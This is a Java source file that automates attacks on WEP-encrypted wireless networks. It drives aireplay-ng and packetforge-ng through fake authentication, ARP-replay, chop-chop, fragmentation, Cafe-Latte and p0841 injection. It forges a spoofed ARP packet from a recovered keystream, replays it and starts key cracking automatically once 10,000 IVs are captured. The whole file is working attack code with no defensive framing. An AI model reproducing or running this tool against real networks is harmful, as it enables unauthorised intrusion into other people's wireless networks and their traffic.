import java.io.*;
import java.util.*;

// WEP Fragmentation Attack

public class wepattack1 implements Runnable {
	Thread t;
	public static boolean flag;
	public static Process profrag = null;
	public static Process profrag2 = null;
	public boolean started_autocrack = false;
	
	public wepattack1() {
		t = new Thread(this, "WEP Attack 1");
		flag = false;
	}
	
	public void run() {
		String line, wificard, client = "";
		Process proauth = null;
		BufferedReader in = null;
		started_autocrack = false;
		
		test2.stat("Initializing...");
		
		// get wifi card (found in test2.java)
		wificard = (String)test2.drivers.getItemAt(test2.drivers.getSelectedIndex());
		
		// get clients (if any are selected)
		if (test2.chkclient.isSelected() == true) {
			client = (String)test2.clients.getItemAt(test2.clients.getSelectedIndex());
			if (client.equals("[no clients found]") == true)
				client = "";
			else
				client = " -h " + client;
		}
		if (client.equals("") == true) {
			// run fake auth in the background, only run once (for now).
			test2.stat("Fake-authenticating with Access Point...");
			try {
				proauth = Runtime.getRuntime().exec(
					"aireplay-ng -1 0 -a " + test2.currentBSSID + " -T 1 " + wificard);
				// only tries to fake-auth once.
				in = new BufferedReader(new InputStreamReader(proauth.getInputStream()));
				line = null;
				boolean associate = false;
				while ( (line = in.readLine()) != null) {
					if (line.indexOf("Association successful") >= 0) {
						// we've associated successfully
						associate = true;
						break;
					}
				}
				
				proauth.waitFor();
				
				if (associate == false) {
					test2.stat("Authentication FAILED!  Try a client-based attack instead!");
					pause(3);
				} else {
					test2.stat("Authentication successful :D");
					pause(1);
				}
			} catch (InterruptedException ie) {} catch (IOException ioe) {
			} finally {
				proauth.destroy();
				try {
					in.close();
				} catch(IOException ioe) {}
			}
			
			client = " -h " + getMac(wificard);
		}
		
		switch(test2.wepattack.getSelectedIndex()) {
		case 1: // ARP-Replay Attack
			test2.stat("Running ARP-Replay Attack; Auto-Crack at 10,000+ IVs");
			try {
				profrag2 = Runtime.getRuntime().exec(
						"xterm -fg green -bg black -geom 100x15+0+225 -iconic -e " + 
						"aireplay-ng -3 -b " + test2.currentBSSID + 
						"" + client + " " + wificard);
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				profrag2.destroy();
			} catch (IOException ioe) {}
			
			break;
		case 2: // Chop-Chop Attack
			int xval;
			test2.stat("Running Chop-Chop Attack; Auto-Crack at 10,000+ IVs");
			try {
				profrag2 = Runtime.getRuntime().exec(
						// "xterm -fg green -bg black -geom 100x15+0+225 -iconic -e " + 
						"aireplay-ng -4 " + client + 
						" -b " + test2.currentBSSID + " -F " + wificard);
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
					try {
						xval = profrag2.exitValue();
						flag = false;
					} catch (IllegalThreadStateException itse) {
						// aireplay is done.
					}
				} while (flag == false);
				profrag2.destroy();
			} catch (IOException ioe) {}
			break;
		case 3: // Fragmentation Attack
			System.out.println("WTF="+test2.wepattack.getSelectedIndex());
			test2.stat("Starting fragmentation attack...");
			
			// delete old arp replay file
			try {
				profrag = Runtime.getRuntime().exec("rm -rf arprequest");
				profrag.waitFor();
				profrag.destroy();
			} catch (IOException ioe) {} catch(InterruptedException ie) {}
			
			// start fragmentation attack
			String keystream = "";
			while ( (flag == false) && (keystream.equals("") == true) ) {
				try {
					profrag = Runtime.getRuntime().exec(
						"aireplay-ng -5 -b " + test2.currentBSSID + 
						"" + client + " -F " + wificard);
					in = new BufferedReader(new InputStreamReader(profrag.getInputStream()));
					
					test2.stat("Waiting for data packets...");
					
					line = null;
					while ( (line = in.readLine()) != null) {
						if (line.indexOf("Saving keystream in") >= 0) {
							// this contains the keystream!
							keystream = line.substring(20);
							in.close();
							break;
						}
					}
					profrag.waitFor();
					profrag.destroy();
				} catch (IOException ie) {
					System.out.println("IOX");
				} catch (InterruptedException ie) {
					System.out.println("IEX");
				} finally {
					try {
						in.close();
					} catch(IOException ioe) {} catch(NullPointerException npe) {}
				}
				
			} // while ( (flag == false) && (keystream.equals("") == true) );
			
			profrag.destroy();
			
			// if we have a keystream, we need to build the arp
			if (keystream.equals("") == false) {
				// if keystream != "", then we have a keystream! to the batmobile!
				test2.stat("We have a keystream! Building arp packet...");
				try {
					String mymac = getMac(wificard);
					
					profrag = Runtime.getRuntime().exec( // "xterm -fg green -bg black -e " + 
						"packetforge-ng -0 -a " + test2.currentBSSID + 
						" -h " + mymac + " -k 255.255.255.255 -l 255.255.255.255 " + 
						"-y " + keystream + " -w arprequest");
					
					profrag.waitFor(); // wait for file to be generated
					
					// possibly use instream to read what packetforge-ng says
					// i think it's safe to assume packetforge would be all "here's your arp packet"
					profrag.destroy();
					
					// delete the keystream
					profrag = Runtime.getRuntime().exec("rm " + keystream);
					profrag.waitFor();
					profrag.destroy();
					
					test2.stat("Re-playing spoofed arp; Auto-Crack at 10,000+ IVS");
					// now the file 'arprequest' is the arp request we can replay over and over...
					profrag2 = Runtime.getRuntime().exec( // "xterm -fg green -bg black -e " + 
						"aireplay-ng -2 -r arprequest -F " + wificard);
				} catch (IOException ioe) {} catch (InterruptedException ie) {}
				
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				
				profrag2.destroy();
			} else {
				// must have been stopped
				// test2.stat("WEP Fragmentation Attack Stopped");
			}
			break;
		case 4: // Cafe-Latte Attack
			test2.stat("Running Cafe-Latte Attack; Auto-Crack at 10,000+ IVs");
			try {
				profrag2 = Runtime.getRuntime().exec(
						"xterm -fg green -bg black -geom 100x15+0+225 -iconic -e " + 
						"aireplay-ng -6 " + 
						client + " " + 
						"-b " + test2.currentBSSID + " -D " + wificard);
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				profrag2.destroy();
			} catch (IOException ioe) {}
			break;
		case 5: // p0841 Attack
			test2.stat("Running p0841 Attack; Auto-Crack at 10,000+ IVs");
			try {
				profrag2 = Runtime.getRuntime().exec(
						"xterm -fg green -bg black -geom 100x15+0+225 -iconic -e " + 
						"aireplay-ng -2 " + 
						"-b " + test2.currentBSSID + " -t 1 " + 
						"" + client + " -p 0841 " + wificard);
							// -m 68 -n 86 (min/max packet size)
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				profrag2.destroy();
			} catch (IOException ioe) {}
			
			break;
		default:
		}
		
		// delete all those damn replay_ packets!
		deleteAllReplay();
		
		test2.buttonStart.setLabel("Start Attack");
		
		// stop all processes.
		try {
			test2.pro1.destroy();
		} catch (NullPointerException npe) {}
		try {
			profrag.destroy();
		} catch (NullPointerException npe) {}
		try {
			profrag2.destroy();
		} catch (NullPointerException npe) {}
		try {
			proauth.destroy();
		} catch (NullPointerException npe) {}
		
		// remove excess files
		try {
			// don't delete capture file!
			/* profrag = Runtime.getRuntime().exec("rm -rf wep-01.ivs");
			 * profrag.waitFor();
			 * profrag.destroy();
			*/
			
			profrag = Runtime.getRuntime().exec("rm -rf wep-01.csv");
			profrag.waitFor();
			profrag.destroy();
			
			profrag = Runtime.getRuntime().exec("rm -rf arprequest");
			profrag.waitFor();
			profrag.destroy();
		} catch (IOException ioe) {} catch(InterruptedException ie) {}
	}
	public void showIVS() {
		Scanner red = null;
		String line, ivs = "";
		String[] arr;
		try {
			red = new Scanner(new FileReader("wep-01.csv"));
			while (red.hasNext() == true) {
				line = red.nextLine();
				if ((line.indexOf(test2.currentBSSID) >= 0) && (line.indexOf("WEP") >= 0 )) {
					arr = line.split(", ");
					ivs = arr[10];
				}
			}
		} catch(FileNotFoundException fnfe) {}
		if (ivs.equals("") == true)
			ivs = "0";
		
		// test2.wepivs.setText("IVS: " + ivs);
		ivs = ivs.replace(" ", "");
		int count = 0;
		try {
			count = Integer.parseInt(ivs);
		} catch (NumberFormatException nfe) {}
		test2.wepivs.setText("Captured IVs: " + String.format("%,d", count));
		
		// if we haven't tried cracking yet, and we're over 10,000 IVs...
		if ( (count >= 10000) && 
		     (test2.buttonCrack.getLabel().equals("Start Cracking") == true) && 
		     (started_autocrack == false)) {
			started_autocrack = true;
			test2.wepCrack();
		}
	}
	public String getMac(String iface) {
		// finds macaddress of 'iface' device
		BufferedReader in = null;
		Process promac = null;
		String result = "", line;
		
		try {
			// start ifconfig on the interface, reading the info
			promac = Runtime.getRuntime().exec("ifconfig " + iface);
			in = new BufferedReader(new InputStreamReader(promac.getInputStream()));
			promac.waitFor();
			
			// go through everyline of ifconfig output
			while ((line = in.readLine()) != null) {
				if (line.indexOf("HWaddr ") >= 0) {
					result = line.substring(line.indexOf("HWaddr ") + 7, line.indexOf("HWaddr ") + 7 + 17);
					result = result.replace('-', ':');
					break;
				}
			}
			try {
				in.close();
			} catch(IOException ioe) {}
			
		} catch (IOException ie) {} catch (InterruptedException ie) {}
		
		return result;
	}
	public void deleteAllReplay() {
		Process prodel = null;
		BufferedReader in = null;
		try {
			prodel = Runtime.getRuntime().exec("ls");
			in = new BufferedReader(new InputStreamReader(prodel.getInputStream()));
			prodel.waitFor();
			
			String line = null, all = "";
			while ( (line = in.readLine()) != null) {
				all += line + "\n";
			}
			String[] halp = all.split("\n");
			for (int i = 0; i < halp.length; i++) {
				if (halp[i].length() > 10) {
					if ((halp[i].substring(0,7).equals("replay_") == true) &&
					 halp[i].substring(halp[i].length() - 3).equals("cap")) {
						prodel = Runtime.getRuntime().exec("rm " + halp[i]);
						prodel.waitFor();
					}
				}
			}
		} catch (IOException ioe) {
		} catch (InterruptedException ie) {}
		prodel.destroy();
	}
	public static void pause(double dtime) {
		// pauses for selected period of time (IN SECONDS)
		try {
			Thread.currentThread().sleep((int)(dtime * 1000));
		}
			catch (InterruptedException e) {}
	}
}